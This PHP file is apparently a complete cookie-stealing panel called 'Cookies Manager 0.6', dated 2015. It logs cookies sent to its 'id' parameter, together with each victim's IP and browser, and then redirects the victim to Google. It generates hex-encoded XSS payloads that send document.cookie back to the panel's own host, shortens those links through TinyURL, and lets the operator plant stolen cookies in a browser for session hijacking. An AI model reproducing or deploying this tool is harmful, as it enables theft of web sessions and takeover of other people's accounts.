<?php

// Cookies Manager 0.6
// (C) Doddy Hackman 2015

// Login

$username = "admin"; // Edit
$password = "21232f297a57a5a743894a0e4a801fc3"; // Edit 

// DB

$host  = "localhost"; // Edit
$userw = "root"; // Edit
$passw = ""; // Edit
$db    = "cookies"; // Edit

// Functions

function hex_encode($text)
{
    $texto = chunk_split(bin2hex($text), 2, '%');
    return $texto = '%' . substr($texto, 0, strlen($texto) - 1);
}

function parsear_cookie($leyendo)
{
    
    $leyendo   = str_replace("comment=", "", $leyendo);
    $leyendo   = str_replace("Set-Cookie: ", "", $leyendo);
    $contenido = explode(";", $leyendo);
    
    $nombre       = "";
    $valor_cookie = "";
    $expires      = "";
    $path         = "";
    $domain       = "";
    $secure       = "false";
    $httponly     = "false";
    
    foreach ($contenido as $valor) {
        
        if (preg_match("/expires=(.*)/", $valor, $regex)) {
            $expires = $regex[1];
        }
        
        elseif (preg_match("/path=(.*)/", $valor, $regex)) {
            $path = $regex[1];
        } elseif (preg_match("/domain=(.*)/", $valor, $regex)) {
            $domain = $regex[1];
        } elseif (preg_match("/secure=(.*)/", $valor, $regex)) {
            $secure = $regex[1];
        } elseif (preg_match("/httponly=(.*)/", $valor, $regex)) {
            $httponly = $regex[1];
        }
        
        else {
            
            if (preg_match("/(.*)=(.*)/", $valor, $regex)) {
                $nombre       = $regex[1];
                $valor_cookie = $regex[2];
            }
            
        }
        
    }
    
    return array(
        $nombre,
        $valor_cookie,
        $expires,
        $path,
        $domain,
        $secure,
        $httponly
    );
    
}

function ver_cookies_de_pagina($pagina)
{
    $cookies = "";
    if (!function_exists('curl_exec')) {
        $options = array(
            'http' => array(
                'user_agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
            )
        );
        $context = stream_context_create($options);
        file_get_contents($pagina);
        foreach ($http_response_header as $valores) {
            if (preg_match("/Set-Cookie/", $valores)) {
                $valores = str_replace("Set-Cookie:", "", $valores);
                $cookies = $cookies . trim($valores) . "\n";
            }
        }
    } else {
        $nave = curl_init($pagina);
        curl_setopt($nave, CURLOPT_TIMEOUT, 5);
        curl_setopt($nave, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($nave, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0");
        curl_setopt($nave, CURLOPT_HEADER, 1);
        curl_setopt($nave, CURLOPT_NOBODY, 1);
        $contenido = curl_exec($nave);
        curl_close($nave);
        $leyendo = explode("\n", trim($contenido));
        
        foreach ($leyendo as $valores) {
            if (preg_match("/Set-Cookie/", $valores)) {
                $valores = str_replace("Set-Cookie:", "", $valores);
                $cookies = $cookies . trim($valores) . "\n";
            }
        }
    }
    return $cookies;
}

function toma($target)
{
    $code = "";
    if (function_exists('curl_exec')) {
        $nave = curl_init($target);
        curl_setopt($nave, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0');
        curl_setopt($nave, CURLOPT_TIMEOUT, 5);
        curl_setopt($nave, CURLOPT_RETURNTRANSFER, true);
        $code = curl_exec($nave);
    } else {
        $options = array(
            'http' => array(
                'user_agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0'
            )
        );
        $context = stream_context_create($options);
        $code    = file_get_contents($target);
    }
    return $code;
}

//

error_reporting(0);

mysql_connect($host, $userw, $passw);
mysql_select_db($db);

if (isset($_GET['id'])) {
    
    if (empty($_GET['id'])) {
        error();
    }
    
    $dia = mysql_real_escape_string(date("d.m.Y"));
    $ip  = mysql_real_escape_string($_SERVER["REMOTE_ADDR"]);
    
    if ($ip == "::1") {
        $ip = "127.0.0.1";
    }
    
    $info = mysql_real_escape_string($_SERVER["HTTP_USER_AGENT"]);
    $ref  = mysql_real_escape_string($_SERVER["HTTP_REFERER"]);
    
    $cookie = mysql_real_escape_string($_GET['id']);
    
    mysql_query("INSERT INTO cookies_found(id,fecha,ip,info,cookie) values(NULL,'$dia','$ip','$info','$cookie')");
    
    header("Location:http://www.google.com.ar");
    
}

elseif (isset($_COOKIE['login'])) {
    
    $st = base64_decode($_COOKIE['login']);
    
    $plit = explode("@", $st);
    $user = $plit[0];
    $pass = $plit[1];
    
    if ($user == $username and $pass == $password) {
        
        echo '
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <title>Cookies Manager 0.6</title>
      <link href="style.css" rel="stylesheet" type="text/css" />
      <link rel="shortcut icon" href="images/icono.png">
   </head>
   <body>
   <center>';
        
        echo '<br><img src="images/cookies.png" /><br>';
        
        if (isset($_POST['makecookies'])) {
            
            if (setcookie($_POST['name_cookie'], $_POST['value_cookie'], time() + 7200, $_POST['path_cookie'], $_POST['domain_cookie'])) {
                echo "<script>alert('Cookie maked');</script>";
            } else {
                echo "<script>alert('Error making Cookie');</script>";
            }
        }
        
        $edit_name       = "";
        $edit_value      = "";
        $edit_expire     = "";
        $edit_path       = "";
        $edit_domain     = "";
        $edit_secure     = "";
        $edit_httponline = "";
        
        if (isset($_POST['instalar'])) {
            
            $cookies_found = "create table cookies_found (
id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,
fecha TEXT NOT NULL,
ip TEXT NOT NULL,
info TEXT NOT NULL,
cookie TEXT NOT NULL,
PRIMARY KEY (id));
";
            
            if (mysql_query($cookies_found)) {
                echo "<script>alert('Installed');</script>";
            } else {
                echo "<script>alert('Error');</script>";
            }
        }
        
        if (mysql_num_rows(mysql_query("show tables like 'cookies_found'"))) {
            
            //
            
            if (isset($_GET['del'])) {
                if (is_numeric($_GET['del'])) {
                    if (@mysql_query("delete from cookies_found where id='" . $_GET['del'] . "'")) {
                        echo "<script>alert('Cookie deleted');</script>";
                    } else {
                        echo "<script>alert('Error');</script>";
                    }
                }
            }
            
            // Cookies Found
            
            
            $re  = mysql_query("select * from cookies_found order by id ASC");
            $con = mysql_num_rows($re);
            echo '
            <div class="post">
                <h3>Cookies Found : ' . $con . '</h3>
                   <div class="post_body"><br>';
            
            if ($con <= 0) {
                echo '<b>No cookies found</b><br>';
            } else {
                
                echo '<table>';
                echo "<td><b>ID</b></td><td><b>Date</b></td><td><b>IP</b></td><td><b>Data</b></td><td><b>Cookie</b></td><td><b>Name</b></td><td><b>Value</b></td><td><b>Option</b></td><tr>";
                
                while ($ver = mysql_fetch_array($re)) {
                    $cookies_view = $ver[4];
                    list($nombre, $valor_cookie, $expires, $path, $domain, $secure, $httponly) = parsear_cookie($cookies_view);
                    
                    echo "<td>" . htmlentities($ver[0]) . "</td><td>" . htmlentities($ver[1]) . "</td><td>" . htmlentities($ver[2]) . "</td><td>" . htmlentities($ver[3]) . "</td>";
                    echo "<td>" . htmlentities($cookies_view) . "</td><td>" . htmlentities($nombre) . "</td><td>" . htmlentities($valor_cookie) . "</td><td><a href=?del=" . htmlentities($ver[0]) . ">Delete</a></td><tr>";
                    
                }
                echo "</table>";
                
            }
            
            echo '               <br></div>
            </div>';
            
            //
            
            // Form para target
            
            echo '
            <div class="post">
                <h3>Enter Target</h3>
                   <div class="post_body"><br>';
            
            echo "
<form action='' method=POST>
<b>Link : </b><input type=text size=40 name=target value='http://localhost/dhlabs/xss/index.php?msg='=></td><tr>
<input type=submit name=getcookies style='height: 25px; width: 100px' value='Get Cookies'> <input type=submit name=generateurl style='height: 25px; width: 100px' value=Generate URL></td>
</form>
 
";
            
            echo '               <br></div>
            </div>';
            
            // URLS
            
            if (isset($_POST['generateurl'])) {
                
                echo '
            <div class="post">
                <h3>Console</h3>
                   <div class="post_body"><br>';
                
                echo "<textarea cols=50 name=code readonly>\n";
                $script         = hex_encode("<script>document.location='http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "?id='+document.cookie;</script>");
                //echo "http://tinyurl.com/api-create.php?url=".$_POST['target'].$script."\n";
                $resultado_code = toma("http://tinyurl.com/api-create.php?url=" . $_POST['target'] . $script);
                echo htmlentities($resultado_code);
                echo "\n</textarea></table>";
                
                echo '               <br><br></div>
            </div>';
                
            }
            //
            
            // Get Cookies
            
            if (isset($_POST['getcookies'])) {
                
                echo '
            <div class="post">
                <h3>Console</h3>
                   <div class="post_body"><br>';
                
                echo "<textarea cols=50 rows=10 name=code readonly>\n";
                $resultado_code = ver_cookies_de_pagina($_POST['target']);
                echo htmlentities($resultado_code);
                echo "\n</textarea>";
                
                echo '               <br><br></div>
            </div>';
                
                $leyendo_esto = split("\n", $resultado_code);
                
                list($nombre, $valor_cookie, $expires, $path, $domain, $secure, $httponly) = parsear_cookie($leyendo_esto[0]);
                
                $edit_name       = $nombre;
                $edit_value      = $valor_cookie;
                $edit_expire     = $expires;
                $edit_path       = $path;
                $edit_domain     = $domain;
                $edit_secure     = $secure;
                $edit_httponline = $httponly;
                
            }
            
            //
            
            // Form para crear cookies
            
            
            echo '
            <div class="post">
                <h3>Cookie Maker</h3>
                   <div class="post_body"><br>';
            
            echo "
<form action='' method=POST>
<b>Name : </b><input type=text size=50 name=name_cookie value='$edit_name'><br><br>
<b>Value : </b><input type=text size=50 name=value_cookie value='$edit_value'><br><br>
<b>Expires : </b><input type=text size=50 name=expire_cookie value='$edit_expire'><br><br>
<b>Path : </b><input type=text size=50 name=path_cookie value='$edit_path'><br><br>
<b>Domain : </b><input type=text size=50 name=domain_cookie value='$edit_domain'><br><br>
<b>Secure : </b><input type=text size=50 name=secure_cookie value='$edit_secure'><br><br>
<b>HTTP Online : </b><input type=text size=50 name=httponline_cookie value='$edit_httponline'><br><br>
<input type=submit name=makecookies style='height: 25px; width: 200px' value='Make Cookie'>
</form>";
            
            echo '                <br></div>
            </div>';
            
        } else {
            
            echo '
            <div class="post">
                <h3>Installer</h3>
                   <div class="post_body">';
            echo "
<form action='' method=POST>
<h2>Do you want install Cookies Manager ?</h2><br>
<input type=submit name=instalar value=Install>
</form><br>";
            
            echo '                </div>
            </div>';
        }
        
        echo '  
        <br><h3>(C) Doddy Hackman 2015</h3><br>
        </center>
        </body>
</html>';
        
    } else {
        echo "<script>alert('Fuck You');</script>";
    }
} else {
    echo '<meta http-equiv="refresh" content="0; url=http://www.petardas.com" />';
}

// The End ?

?>